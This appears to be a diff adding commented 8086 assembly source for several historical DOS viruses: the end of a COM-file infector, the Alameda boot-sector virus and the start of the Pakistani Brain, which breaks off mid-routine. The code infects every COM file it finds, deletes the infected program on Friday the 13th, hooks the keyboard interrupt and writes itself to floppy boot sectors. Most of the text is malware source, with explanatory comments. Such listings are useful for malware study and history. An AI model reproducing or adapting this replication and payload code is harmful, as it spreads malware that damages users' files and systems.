+PUSH CX             ;<br>
+PUSH DX             ;<br>
+PUSH SI             ;<br>
+PUSH DI             ;<br>
+PUSH BP             ;<br>
+PUSH DS             ;! NOT ES !<br>
+;<br>
+MOV  BP,SP               ;SAVE HOST offset (IN STACK)<br>
+MOV  word ptr [BP+16],100H    ;   (FOR LATER RETF TO HOST)<br>
+;<br>
+CALL DUMMY               ;MOV AX,IP<br>
+DUMMY:   POP  AX             ;<br>
+SUB  AX,(offset DUMMY - offset BEGIN)<br>
+;<br>
+MOV  CL,4           ;PASS CONTROL TO OURSELF WITH IP=100H<br>
+SHR  AX,CL               ;<br>
+MOV  BX,CS               ;<br>
+ADD  AX,BX               ;<br>
+SUB  AX,10H              ;<br>
+PUSH AX             ;(OUR MODIFIED CS)<br>
+MOV  AX,offset IN_CONTROL     ;(OUR IP)<br>
+PUSH AX             ;<br>
+RETF                ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;-----------------------------------------------------------------------;<br>
+IN_CONTROL:                  ;<br>
+MOV  AX,CS               ;(INIT DS)<br>
+MOV  DS,AX               ;<br>
+;<br>
+CALL REPLICATE      ;<br>
+CALL DO_STUFF       ;DO STUFF HERE<br>
+;<br>
+JMP  ALL_DONE       ;PASS CONTROL TO HOST<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; REPRODUCE                                 ;<br>
+;-----------------------------------------------------------------------;<br>
+REPLICATE:                   ;<br>
+PUSH ES             ;<br>
+;<br>
+PUSH DS             ;<br>
+POP  ES             ;<br>
+;<br>
+MOV  AH,1AH              ;SET DTA<br>
+MOV  DX,OFFSET DTA       ;<br>
+INT  21H            ;<br>
+;<br>
+MOV  AH,4EH              ;FIND FIRST<br>
+XOR  CX,CX               ;<br>
+MOV  DX,OFFSET HOST_TYPE ;<br>
+INT  21H            ;<br>
+JC   R_90           ;<br>
+;<br>
+R_10:    CALL ATTACH              ;INFECT FOUND FILE<br>
+;<br>
+MOV  AH,4FH              ;FIND NEXT<br>
+INT  21H            ;<br>
+JNC  R_10           ;UNTIL NO MORE FOUND<br>
+;<br>
+R_90:    POP  AX             ;<br>
+PUSH AX             ;<br>
+;<br>
+PUSH DS             ;<br>
+MOV  DS,AX               ;<br>
+MOV  AH,1AH              ;RESTORE DTA<br>
+MOV  DX,0080H       ;<br>
+INT  21H            ;<br>
+POP  DS             ;<br>
+;<br>
+POP  ES             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;-----------------------------------------------------------------------;<br>
+ATTACH:  PUSH ES             ;IF 'COMMAND.COM' ATTEMPTED...<br>
+MOV  AX,DS               ;<br>
+MOV  ES,AX               ;<br>
+MOV  SI,offset HOST_NAME ;<br>
+MOV  DI,offset COMMAND_COM    ;<br>
+MOV  CX,COMMAND_LENGTH   ;<br>
+CLD                 ;<br>
+REPE CMPSB               ;<br>
+POP  ES             ;<br>
+JNE  A_01           ;<br>
+JMP  A_99           ;...DONT INFECT IT<br>
+;<br>
+A_01:    MOV  AX,3D02H       ;OPEN R/W<br>
+MOV  DX,offset HOST_NAME ;ie. '\COMMAND.COM'<br>
+INT  21H            ;<br>
+JNC  A_03           ;<br>
+JMP  A_90           ;<br>
+;<br>
+A_03:    MOV  BX,AX               ;BX=HANDLE<br>
+;<br>
+PUSH word ptr [HOST_3]   ;SAVE<br>
+PUSH word ptr [HOST_3+2] ;SAVE<br>
+;<br>
+MOV  AH,3FH              ;READ FIRST 3 BYTES<br>
+MOV  CX,3           ;<br>
+MOV  DX,offset HOST_3    ;<br>
+INT  21H            ;<br>
+JC   A_80           ;<br>
+;<br>
+MOV  AL,[NEW_3]          ;IF ALREADY INFECTED...<br>
+CMP  [HOST_3],AL         ; (YOU CAN TELL BY THE JUMP INSTRUCTION<br>
+JNE  A_05           ;  AND BY THE SIZE OF THE JUMP)<br>
+MOV  AX,[HOST_SIZE]      ;<br>
+SUB  AX,(offset OUR_END - offset BEGIN)<br>
+SUB  AX,3           ;<br>
+CMP  word ptr [HOST_3+1],AX   ;<br>
+JE   A_85           ;...DONT INFECT AGAIN<br>
+;<br>
+A_05:    MOV  AX,4202H       ;POINT TO THE END<br>
+XOR  CX,CX               ;<br>
+XOR  DX,DX               ;<br>
+INT  21H            ;<br>
+JC   A_80           ;<br>
+;<br>
+OR   AX,0FH              ;ROUND UP TO NEXT PARAGRAPH<br>
+INC  AX             ;<br>
+SUB  AX,3           ;(TAKE INTO ACOUNT JMP INSTRUCTION SIZ)<br>
+MOV  [OUR_BEGIN],AX      ;<br>
+;<br>
+MOV  AX,4200H       ;POINT TO FIRST 3 BYTES<br>
+XOR  CX,CX               ;<br>
+XOR  DX,DX               ;<br>
+INT  21H            ;<br>
+JC   A_80           ;<br>
+;<br>
+MOV  AH,40H              ;WRITE NEW 3 BYTES<br>
+MOV  CX,3           ;<br>
+MOV  DX,offset NEW_3          ;<br>
+INT  21H            ;<br>
+JC   A_80           ;<br>
+;<br>
+;REMEMBER, WERE ALREADY POINTING PAST THE FIRST 3 BYTES!<br>
+MOV  AX,4201H       ;POINT TO END (ROUNDED UP TO PARA)<br>
+XOR  CX,CX               ;<br>
+MOV  DX,[OUR_BEGIN]      ;<br>
+INT  21H            ;<br>
+JC   A_80           ;<br>
+;<br>
+MOV  AH,40H              ;APPEND VIRUS TO END OF FILE<br>
+MOV  CX,(offset OUR_END - offset BEGIN)<br>
+MOV  DX,offset BEGIN          ;<br>
+INT  21H            ;<br>
+JC   A_80           ;<br>
+;<br>
+JMP  A_85           ;CLOSE AND RETURN<br>
+;<br>
+A_80:    ;CALL     BEEP           ;<br>
+;<br>
+A_85:    POP  word ptr [HOST_3+2] ;SAVE<br>
+POP  word ptr [HOST_3]   ;SAVE<br>
+;<br>
+MOV  AH,3EH              ;CLOSE FILE<br>
+INT  21H            ;<br>
+;<br>
+A_90:    JNC  A_99           ;<br>
+;CALL     BEEP           ;<br>
+A_99:    RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; DO STUFF                                       ;<br>
+;-----------------------------------------------------------------------;<br>
+DO_STUFF:                    ;<br>
+PUSH ES             ;<br>
+;<br>
+MOV  AH,2AH              ;GET DATE<br>
+INT  21H            ;<br>
+;<br>
+CMP  DL,13               ;IF FRIDAY THE 13th...<br>
+JNE  DS_90               ;<br>
+CMP  AL,5           ;<br>
+JNE  DS_90               ;<br>
+;<br>
+XOR  AX,AX               ;FIND OUT INFECTED NAME<br>
+MOV  CX,32767       ;<br>
+XOR  DI,DI               ;<br>
+MOV  ES,ES:[002CH]       ;<br>
+CLD                 ;<br>
+REPNE     SCASW               ;<br>
+JNE  DS_90               ;<br>
+ADD  DI,2           ;SKIP '01 00'<br>
+;<br>
+PUSH DS             ;DELETE SELF<br>
+PUSH ES             ;<br>
+POP  DS             ;<br>
+MOV  AH,41H              ;<br>
+MOV  DX,DI               ;<br>
+INT  21H            ;<br>
+POP  DS             ;<br>
+;<br>
+DS_90:   POP  ES             ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; PASS CONTROL TO THE HOST PROGRAM                         ;<br>
+;-----------------------------------------------------------------------;<br>
+ALL_DONE:                    ;<br>
+MOV  AX,word ptr [HOST_3]     ;RESTORE HOSTS FIRST 3 BYTES<br>
+MOV  ES:[100H],AX        ;<br>
+MOV  AL,[HOST_3+2]       ;<br>
+MOV  ES:[102H],AL        ;<br>
+;<br>
+POP  DS             ;! NOT ES !<br>
+POP  BP             ;<br>
+POP  DI             ;<br>
+POP  SI             ;<br>
+POP  DX             ;<br>
+POP  CX             ;<br>
+POP  BX             ;<br>
+POP  AX             ;<br>
+;<br>
+RETF                ;<br>
+;<br>
+OUR_END  LABEL     BYTE           ;<br>
+;<br>
+CODE     ENDS                ;<br>
+END  BEGIN               ;<br>
+<br>
+<br>
+<br>
+********************************************************************<br>
+-----------------------------------------------------------------<br>
+-----------------------------------------------------------------<br>
+********************************************************************<br>
+<br>
+The "Alameda Virus".<br>
+Also Called - Merritt Virus, Yale Virus, Peking Virus, Seoul Virus<br>
+<br>
+<br>
+PAGE 64,132<br>
+;-----------------------------------------------------------------------;<br>
+; This virus is of the "FLOPPY ONLY" variety.                   ;<br>
+; It replicates to the boot sector of a floppy disk and when it gains control<br>
+<br>
+; it will move itself to upper memory.  It redirects the keyboard      ;<br>
+; interrupt (INT 09H) to look for ALT-CTRL-DEL sequences at which time    ;<br>
+; it will attempt to infect any floppy it finds in drive A:.         ;<br>
+; It keeps the real boot sector at track 39, sector 8, head 0    ;<br>
+; It does not map this sector bad in the fat (unlike the Pakistani Brain)<br>
+; and should that area be used by a file, the virus  ;<br>
+; will die.  It also contains no anti detection mechanisms as does the    ;<br>
+; BRAIN virus.  It apparently uses head 0, sector 8 and not head 1   ;<br>
+; sector 9 because this is common to all floppy formats both single  ;<br>
+; sided and double sided.  It does not contain any malevolent TROJAN ;<br>
+; HORSE code.  It does appear to contain a count of how many times it    ;<br>
+; has infected other diskettes although this is harmless and the count    ;<br>
+; is never accessed.                                 ;<br>
+;                                           ;<br>
+; Things to note about this virus:                         ;<br>
+; It can not only live through an ALT-CTRL-DEL reboot command, but this   ;<br>
+; is its primary (only for that matter) means of reproduction to other    ;<br>
+; floppy diskettes.  The only way to remove it from an infected system    ;<br>
+; is to turn the machine off and reboot an uninfected copy of DOS.   ;<br>
+; It is even resident when no floppy is booted but BASIC is loaded   ;<br>
+; instead.  Then when ALT-CTRL-DEL is pressed from inside of BASIC,  ;<br>
+; it activates and infectes the floppy from which the user is        ;<br>
+; attempting to boot.                                 ;<br>
+;                                           ;<br>
+; Also note that because of the POP CS command to pass control to    ;<br>
+; its self in upper memory, this virus does not to work on 80286     ;<br>
+; machines (because this is not a valid 80286 instruction).          ;<br>
+;                                           ;<br>
+; The Norton utilities can be used to identify infected diskettes by ;<br>
+; looking at the boot sector and the DOS SYS utility can be used to  ;<br>
+; remove it (unlike the Brain).                                     ;<br>
+;-----------------------------------------------------------------------;<br>
+;<br>
+ORG  7C00H               ;<br>
+;<br>
+TOS LABEL     WORD           ;TOP OF STACK<br>
+;-----------------------------------------------------------------------;<br>
+; 1. Find top of memory and copy ourself up there. (keeping same offset);<br>
+; 2. Save a copy of the first 32 interrupt vectors to top of memory too   ;<br>
+; 3. Redirect int 9 (keyboard) to ourself in top of memory      ;<br>
+; 4. Jump to ourself at top of memory                      ;<br>
+; 5. Load and execute REAL boot sector from track 40, head 0, sector 8    ;<br>
+;-----------------------------------------------------------------------;<br>
+BEGIN:   CLI                 ;INITIALIZE STACK<br>
+XOR  AX,AX               ;<br>
+MOV  SS,AX               ;<br>
+MOV  SP,offset TOS       ;<br>
+STI                 ;<br>
+;<br>
+MOV  BX,0040H       ;ES = TOP OF MEMORY - (7C00H+512)<br>
+MOV  DS,BX               ;<br>
+MOV  AX,[0013H]          ;<br>
+MUL  BX             ;<br>
+SUB  AX,07E0H       ;   (7C00H+512)/16<br>
+MOV  ES,AX               ;<br>
+;<br>
+PUSH CS             ;DS = CS<br>
+POP  DS             ;<br>
+;<br>
+CMP  DI,3456H       ;IF THE VIRUS IS REBOOTING...<br>
+JNE  B_10           ;<br>
+DEC  Word Ptr [COUNTER_1]     ;...LOW&HI:COUNTER_1--<br>
+;<br>
+B_10:    MOV  SI,SP     ;SP=7C00  ;COPY SELF TO TOP OF MEMORY<br>
+MOV  DI,SI               ;<br>
+MOV  CX,512              ;<br>
+CLD                 ;<br>
+REP  MOVSB               ;<br>
+;<br>
+MOV  SI,CX     ;CX=0          ;SAVE FIRST 32 INT VETOR ADDRESSES TO<br>
+MOV  DI,offset BEGIN - 128    ;   128 BYTES BELOW OUR HI CODE<br>
+MOV  CX,128              ;<br>
+REP  MOVSB               ;<br>
+;<br>
+CALL PUT_NEW_09          ;SAVE/REDIRECT INT 9 (KEYBOARD)<br>
+;<br>
+PUSH ES   ;ES=HI         ;JUMP TO OUR HI CODE WITH<br>
+POP  CS             ;   CS = ES<br>
+;<br>
+PUSH DS   ;DS=0          ;ES = DS<br>
+POP  ES             ;<br>
+;<br>
+MOV  BX,SP     ;SP=7C00  ;LOAD REAL BOOT SECTOR TO 0000:7C00<br>
+MOV  DX,CX     ;CX=0          ;   DRIVE A: HEAD 0<br>
+MOV  CX,2708H       ;   TRACK 40, SECTOR 8<br>
+MOV  AX,0201H       ;   READ SECTOR<br>
+INT  13H            ;   (common to 8/9 sect. 1/2 sided!)<br>
+JB   $              ;   HANG IF ERROR<br>
+;<br>
+JMP  JMP_BOOT       ;JMP 0000:7C00<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; SAVE THEN REDIRECT INT 9 VECTOR                     ;<br>
+;                                           ;<br>
+; ON ENTRY:   DS = 0                                  ;<br>
+;        ES = WHERE TO SAVE OLD_09 & (HI)             ;<br>
+;             WHERE NEW_09 IS         (HI)            ;<br>
+;-----------------------------------------------------------------------;<br>
+PUT_NEW_09:                  ;<br>
+DEC  Word Ptr [0413H]    ;TOP OF MEMORY (0040:0013) -= 1024<br>
+;<br>
+MOV  SI,9*4              ;COPY INT 9 VECTOR TO<br>
+MOV  DI,offset OLD_09    ;   OLD_09 (IN OUR HI CODE!)<br>
+MOV  CX,0004             ;<br>
+;<br>
+CLI                 ;<br>
+REP  MOVSB               ;<br>
+MOV  Word Ptr [9*4],offset NEW_09<br>
+MOV  [(9*4)+2],ES        ;<br>
+STI                 ;<br>
+;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; RESET KEYBOARD, TO ACKNOWLEDGE LAST CHAR                 ;<br>
+;-----------------------------------------------------------------------;<br>
+ACK_KEYBD:                   ;<br>
+IN   AL,61H              ;RESET KEYBOARD THEN CONTINUE<br>
+MOV  AH,AL               ;<br>
+OR   AL,80H              ;<br>
+OUT  61H,AL              ;<br>
+XCHG AL,AH               ;<br>
+OUT  61H,AL              ;<br>
+JMP  RBOOT               ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; DATA AREA WHICH IS NOT USED IN THIS VERSION                   ;<br>
+; REASON UNKNOWN                                 ;<br>
+;-----------------------------------------------------------------------;<br>
+TABLE    DB   27H,0,1,2      ;FORMAT INFORMATION FOR TRACK 39<br>
+DB   27H,0,2,2      ;   (CURRENTLY NOT USED)<br>
+DB   27H,0,3,2      ;<br>
+DB   27H,0,4,2      ;<br>
+DB   27H,0,5,2      ;<br>
+DB   27H,0,6,2      ;<br>
+DB   27H,0,7,2      ;<br>
+DB   27H,0,8,2      ;<br>
+;<br>
+;A7C9A   LABEL     BYTE           ;<br>
+DW   00024H              ;NOT USED<br>
+DB   0ADH           ;<br>
+DB   07CH           ;<br>
+DB   0A3H           ;<br>
+DW   00026H              ;<br>
+;<br>
+;L7CA1:                      ;<br>
+POP  CX             ;NOT USED<br>
+POP  DI             ;<br>
+POP  SI             ;<br>
+POP  ES             ;<br>
+POP  DS             ;<br>
+POP  AX             ;<br>
+POPF                ;<br>
+JMP  1111:1111      ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; IF ALT & CTRL & DEL THEN ...                             ;<br>
+; IF ALT & CTRL & ? THEN ...                          ;<br>
+;-----------------------------------------------------------------------;<br>
+NEW_09:  PUSHF                    ;<br>
+STI                 ;<br>
+;<br>
+PUSH AX             ;<br>
+PUSH BX             ;<br>
+PUSH DS             ;<br>
+;<br>
+PUSH CS             ;DS=CS<br>
+POP  DS             ;<br>
+;<br>
+MOV  BX,[ALT_CTRL]       ;BX=SCAN CODE LAST TIME<br>
+IN   AL,60H              ;GET SCAN CODE<br>
+MOV  AH,AL               ;SAVE IN AH<br>
+AND  AX,887FH       ;STRIP 8th BIT IN AL, KEEP 8th BIT AH<br>
+;<br>
+CMP  AL,1DH              ;IS IT A [CTRL]...<br>
+JNE  N09_10              ;...JUMP IF NO<br>
+MOV  BL,AH               ;(BL=08 ON KEY DOWN, BL=88 ON KEY UP)<br>
+JMP  N09_30              ;<br>
+;<br>
+N09_10:  CMP  AL,38H              ;IS IT AN [ALT]...<br>
+JNE  N09_20              ;...JUMP IF NO<br>
+MOV  BH,AH               ;(BH=08 ON KEY DOWN, BH=88 ON KEY UP)<br>
+JMP  N09_30              ;<br>
+;<br>
+N09_20:  CMP  BX,0808H       ;IF (CTRL DOWN & ALT DOWN)...<br>
+JNE  N09_30              ;...JUMP IF NO<br>
+;<br>
+CMP  AL,17H              ;IF [I]...<br>
+JE   N09_X0              ;...JUMP IF YES<br>
+CMP  AL,53H              ;IF [DEL]...<br>
+JE   ACK_KEYBD      ;...JUMP IF YES<br>
+;<br>
+N09_30:  MOV  [ALT_CTRL],BX       ;SAVE SCAN CODE FOR NEXT TIME<br>
+;<br>
+N09_90:  POP  DS             ;<br>
+POP  BX             ;<br>
+POP  AX             ;<br>
+POPF                ;<br>
+;<br>
+DB   0EAH           ;JMP F000:E987<br>
+OLD_09   DW   ?              ;<br>
+DW   0F000H              ;<br>
+;<br>
+N09_X0:  JMP  N09_X1              ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+RBOOT:   MOV  DX,03D8H       ;DISABLE COLOR VIDEO !?!?<br>
+MOV  AX,0800H       ;AL=0, AH=DELAY ARG<br>
+OUT  DX,AL               ;<br>
+CALL DELAY               ;<br>
+MOV  [ALT_CTRL],AX  ;AX=0     ;<br>
+;<br>
+MOV  AL,3 ;AH=0          ;SELECT 80x25 COLOR<br>
+INT  10H            ;<br>
+MOV  AH,2           ;SET CURSOR POS 0,0<br>
+XOR  DX,DX               ;<br>
+MOV  BH,DH               ;   PAGE 0<br>
+INT  10H            ;<br>
+;<br>
+MOV  AH,1           ;SET CURSOR TYPE<br>
+MOV  CX,0607H       ;<br>
+INT  10H            ;<br>
+;<br>
+MOV  AX,0420H       ;DELAY (AL=20H FOR EOI BELOW)<br>
+CALL DELAY               ;<br>
+;<br>
+CLI                 ;<br>
+OUT  20H,AL              ;SEND EOI TO INT CONTROLLER<br>
+;<br>
+MOV  ES,CX     ;CX=0 (DELAY)  ;RESTORE FIRST 32 INT VECTORS<br>
+MOV  DI,CX               ;   (REMOVING OUR INT 09 HANDLER!)<br>
+MOV  SI,offset BEGIN - 128    ;<br>
+MOV  CX,128              ;<br>
+CLD                 ;<br>
+REP  MOVSB               ;<br>
+;<br>
+MOV  DS,CX     ;CX=0          ;DS=0<br>
+;<br>
+MOV  Word Ptr [19H*4],offset NEW_19 ;SET INT 19 VECTOR<br>
+MOV  [(19H*4)+2],CS      ;<br>
+;<br>
+MOV  AX,0040H       ;DS = ROM DATA AREA<br>
+MOV  DS,AX               ;<br>
+;<br>
+MOV  [0017H],AH     ;AH=0     ;KBFLAG (SHIFT STATES) = 0<br>
+INC  Word Ptr [0013H]    ;MEMORY SIZE += 1024 (WERE NOT ACTIVE)<br>
+;<br>
+PUSH DS             ;IF BIOS F000:E502 == 21E4...<br>
+MOV  AX,0F000H      ;<br>
+MOV  DS,AX               ;<br>
+CMP  Word Ptr [0E502H],21E4H  ;<br>
+POP  DS             ;<br>
+JE   R_90           ;<br>
+INT  19H            ;   IF NOT...REBOOT<br>
+;<br>
+R_90:    JMP  0F000:0E502H        ;...DO IT ?!?!?!<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; REBOOT INT VECTOR                                   ;<br>
+;-----------------------------------------------------------------------;<br>
+NEW_19:  XOR  AX,AX               ;<br>
+;<br>
+MOV  DS,AX               ;DS=0<br>
+MOV  AX,[0410]      ;AX=EQUIP FLAG<br>
+TEST AL,1           ;IF FLOPPY DRIVES ...<br>
+JNZ  N19_20              ;...JUMP<br>
+N19_10:  PUSH CS             ;ELSE ES=CS<br>
+POP  ES             ;<br>
+CALL PUT_NEW_09          ;SAVE/REDIRECT INT 9 (KEYBOARD)<br>
+INT  18H            ;LOAD BASIC<br>
+;<br>
+N19_20:  MOV  CX,0004             ;RETRY COUNT = 4<br>
+;<br>
+N19_22:  PUSH CX             ;<br>
+MOV  AH,00               ;RESET DISK<br>
+INT  13             ;<br>
+JB   N19_81              ;<br>
+MOV  AX,0201             ;READ BOOT SECTOR<br>
+PUSH DS             ;<br>
+POP  ES             ;<br>
+MOV  BX,offset BEGIN          ;<br>
+MOV  CX,1           ;TRACK 0, SECTOR 1<br>
+INT  13H            ;<br>
+N19_81:  POP  CX             ;<br>
+JNB  N19_90              ;<br>
+LOOP N19_22              ;<br>
+JMP  N19_10              ;IF RETRY EXPIRED...LOAD BASIC<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+N19_90:  CMP  DI,3456             ;IF NOT FLAG SET...<br>
+JNZ  RE_INFECT      ;...RE INFECT<br>
+;<br>
+JMP_BOOT:                    ;PASS CONTROL TO BOOT SECTOR<br>
+JMP  0000:7C00H          ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+RE_INFECT:                   ;<br>
+MOV  SI,offset BEGIN          ;COMPARE BOOT SECTOR JUST LOADED WITH<br>
+MOV  CX,00E6H       ;   OURSELF<br>
+MOV  DI,SI               ;<br>
+PUSH CS             ;<br>
+POP  ES             ;<br>
+CLD                 ;<br>
+REPE CMPSB               ;<br>
+JE   RI_12               ;IF NOT EQUAL...<br>
+;<br>
+INC  Word Ptr ES:[COUNTER_1]  ;INC. COUNTER IN OUR CODE (NOT DS!)<br>
+;<br>
+;MAKE SURE TRACK 39, HEAD 0 FORMATTED  ;<br>
+MOV  BX,offset TABLE          ;FORMAT INFO<br>
+MOV  DX,0000             ;DRIVE A: HEAD 0<br>
+MOV  CH,40-1             ;TRACK 39<br>
+MOV  AH,5           ;FORMAT<br>
+JMP  RI_10               ;REMOVE THE FORMAT OPTION FOR NOW !<br>
+;<br>
+; &lt;&lt;&lt; NO EXECUTION PATH TO HERE &gt;&gt;&gt;    ;<br>
+JB   RI_80               ;<br>
+;<br>
+;WRITE REAL BOOT SECTOR AT TRACK 39, SECTOR 8, HEAD 0<br>
+RI_10:   MOV  ES,DX               ;ES:BX = 0000:7C00, HEAD=0<br>
+MOV  BX,offset BEGIN          ;TRACK 40H<br>
+MOV  CL,8           ;SECTOR 8<br>
+MOV  AX,0301H       ;WRITE 1 SECTOR<br>
+INT  13H            ;<br>
+;<br>
+PUSH CS             ;   (ES=CS FOR PUT_NEW_09 BELOW)<br>
+POP  ES             ;<br>
+JB   RI_80               ;IF WRITE ERROR...JUMP TO BOOT CODE<br>
+;<br>
+MOV  CX,0001             ;WRITE INFECTED BOOT SECTOR !<br>
+MOV  AX,0301             ;<br>
+INT  13H            ;<br>
+JB   RI_80               ;   IF ERROR...JUMP TO BOOT CODE<br>
+;<br>
+RI_12:   MOV  DI,3456H       ;SET "JUST INFECTED ANOTHER ONE"...<br>
+INT  19H            ;...FLAG AND REBOOT<br>
+;<br>
+RI_80:   CALL PUT_NEW_09          ;SAVE/REDIRECT INT 9 (KEYBOARD)<br>
+DEC  Word Ptr ES:[COUNTER_1]  ;   (DEC. CAUSE DIDNT INFECT)<br>
+JMP  JMP_BOOT       ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+N09_X1:  MOV  [ALT_CTRL],BX       ;SAVE ALT & CTRL STATUS<br>
+;<br>
+MOV  AX,[COUNTER_1]      ;PUT COUNTER_1 INTO RESET FLAG<br>
+MOV  BX,0040H       ;<br>
+MOV  DS,BX               ;<br>
+MOV  [0072H],AX          ;   0040:0072 = RESET FLAG<br>
+JMP  N09_90              ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; DELAY                                          ;<br>
+;                                           ;<br>
+; ON ENTRY    AH:CX = LOOP COUNT                      ;<br>
+;-----------------------------------------------------------------------;<br>
+DELAY:   SUB  CX,CX               ;<br>
+D_01:    LOOP $              ;<br>
+SUB  AH,1           ;<br>
+JNZ  D_01           ;<br>
+RET                 ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+A7DF4         DB   27H,00H,8,2<br>
+<br>
+COUNTER_1     DW   001CH<br>
+ALT_CTRL DW   0<br>
+<br>
+A7DFC         DB   27H,0,8,2<br>
+<br>
+<br>
+<br>
+*********************************************************************<br>
+---------------------------------------------------------------------<br>
+---------------------------------------------------------------------<br>
+*********************************************************************<br>
+<br>
+The "Pakistani Brain"<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+CODE     SEGMENT PUBLIC 'CODE'         ;<br>
+ASSUME CS:CODE,DS:CODE,ES:CODE,SS:NOTHING<br>
+;<br>
+ORG  0         ;<br>
+;<br>
+BPB      EQU  3+8       ;JMP + OEM_NAME<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; COPY OF BOOT SECTOR                                 ;<br>
+;-----------------------------------------------------------------------;<br>
+;<br>
+DB   6 DUP (?) ;<br>
+;<br>
+L0006         DB   ?         ;HEAD<br>
+L0007         DB   ?         ;SECTOR<br>
+L0008         DB   ?         ;TRACK<br>
+;<br>
+L0009         DB   ?         ;HEAD<br>
+L000A         DB   ?         ;SECTOR<br>
+L000B         DB   ?         ;TRACK<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+;<br>
+ORG  512            ;<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; (BOOT SECTOR TYPE FORMAT!)                          ;<br>
+;-----------------------------------------------------------------------;<br>
+CONTINUE:     JMP  CONTINUE_2     ;023C <br>
+;<br>
+L0203         DB   'IBM X3.2'     ;OEM NAME AND VERSION<br>
+;<br>
+DW   512       ;BYTES PER SECTOR<br>
+DB   2         ;SECTORS PER ALLOCATION UNIT<br>
+DW   1         ;RESERVED SECTORS<br>
+L0210         DB   2         ;NUMBER OF FATS<br>
+DW   112       ;NUMBER OF ROOT DIR ENTRIES<br>
+DW   2D0H      ;SECTORS PER DISK<br>
+DB   0FDH      ;MEDIA ID<br>
+DW   2         ;SECTORS PER FAT<br>
+DW   9         ;SECTORS PER TRACK<br>
+DW   2         ;NUMBER OF HEADS<br>
+DW   0         ;HIDDEN SECTORS<br>
+;<br>
+;---------------------------------------;<br>
+DB   0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0<br>
+<br>
+DB   2<br>
+DISK_PARM     DB   0DFH,2,25H,2,12H,2AH,0FFH,50H,0F6H,0,2<br>
+<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+REBOOT:  INT  19H            ;REBOOT<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+;                                           ;<br>
+;-----------------------------------------------------------------------;<br>
+CONTINUE_2:                  ;<br>
+CLI                 ;<br>
+XOR  AX,AX               ;<br>
+MOV  ES,AX               ;ES=0<br>
+MOV  SS,AX               ;SS:SP = 0000:7C00<br>
+MOV  SP,7C00H       ;<br>
+MOV  DS,AX               ;<br>
+MOV  BX,07C0H       ;INITIALIZE DISK POINTER (INT 1E)<br>
+MOV  Word Ptr [78H],2FH  ;0000:0078 = (DWORD) 07C0:002F<br>
+MOV  [7AH],BX       ;<br>
+;<br>
+MOV  DS,BX               ;DS = 07C0<br>
+MOV  DX,[1EH]       ;GET DRIVE/HEAD          ;BOOT:001E !<br>
+MOV  [20H],DL       ;SAVE DRIVE         ;BOOT:0020 !<br>
+INT  13H            ;RESET<br>
+JNB  C_10           ;<br>
+JMP  ERROR_2             ;IF ERROR...'BOOT FAILURE'<br>
+;<br>
+C_10:    MOV  SI,BPB              ;SI = BPB      ;BOOT:000B<br>
+MOV  CX,[SI]             ;CX = BYTES PER SECTOR<br>
+SHR  CH,1           ;WORDS PER SECTOR<br>
+XCHG CH,CL               ;<br>
+MOV  [2BH],CX       ;SAVE               ;BOOT:002B<br>
+MOV  AL,[SI+5]      ;AL= NUMBER OF FATS ;BOOT:0010<br>
+XOR  AH,AH               ;<br>
+MUL  Word Ptr [SI+0BH]   ;TOTAL FAT SECTORS  ;BOOT:0016<br>
+ADD  AX,[SI+3]      ;+RESERVED SECTORS  ;BOOT:000E<br>
+ADD  AX,[SI+11H]         ;+HIDDEN SECTORS    ;BOOT:001C<br>
+MOV  [24H],AX       ;SAVE IT       ;BOOT:0024<br>
+MOV  BX,7E00H       ;<br>
+CALL UI             ;<br>
+;<br>
+MOV  BX,ES               ;SAVE ES<br>
+MOV  AX,70H              ;ES=0070H<br>
+MOV  ES,AX               ;<br>
+MOV  AX,32               ;32*<br>
+MUL  Word Ptr [SI+6]          ;   ROOT DIR ENTRIES+<br>
+MOV  CX,[SI]             ;<br>
+ADD  AX,CX               ;                    BYTES/SECTOR<br>
+DEC  AX             ;                                -1<br>
+DIV  CX             ;                         /BYTES/SECTOR<br>
+ADD  [24H],AX       ;ADD TO BYTES IN BOOT & FAT<br>
+;<br>
+MOV  CL,[2AH]       ;<br>
+MOV  AX,[24H]       ;<br>
+CALL READ_CLUSTER        ;(READ BOOT SECTOR ???)<br>
+;<br>
+PUSH ES             ;<br>
+POP  DS             ;<br>
+JMP  0070H:0000H         ;(PASS CONTROL TO ???)<br>
+;<br>
+;-----------------------------------------------------------------------;<br>
+; HEAVY CRUNCHING HERE (CLUSTER READS ?!?!?!)                   ;<br>
+; ON ENTRY:   AX = ?<br>
+;            ES:BX = DTA                              ;<br>
+;        CL = ?                                  ;<br>
+;        DS:SI = BPB                             ;<br>
+;    DS:[0021] =                                 ;<br>
+;-----------------------------------------------------------------------;<br>
+READ_CLUSTER:                ;02B3<br>
+PUSH BX             ;<br>
+PUSH AX             ;<br>
+;<br>
